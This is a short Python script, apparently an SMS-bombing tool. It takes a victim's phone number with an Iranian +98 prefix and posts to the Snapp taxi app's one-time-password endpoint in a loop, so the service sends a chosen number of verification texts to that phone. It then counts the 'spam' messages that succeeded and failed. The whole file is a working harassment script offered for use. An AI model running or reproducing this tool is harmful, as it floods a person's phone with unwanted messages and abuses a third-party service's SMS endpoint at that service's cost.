from tqdm import tqdm
import requests

phoneNumber = input("Enter phone number: ")
phoneNumber = str(phoneNumber)
mydata = {"cellphone": "+98" + phoneNumber}
urlsend = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
numofmsgs = int(input("Enter number of messages to send: "))
successspamCount = 0
failspamCount = 0
for i in tqdm(range(numofmsgs)):
    resp = requests.post(urlsend, data=mydata)
    if resp.status_code == 200:
        successspamCount = successspamCount + 1
    else:
        failspamCount = failspamCount + 1
print("Total successful messages sent: ",  successspamCount)
print("Total failed messages sent: ", failspamCount)
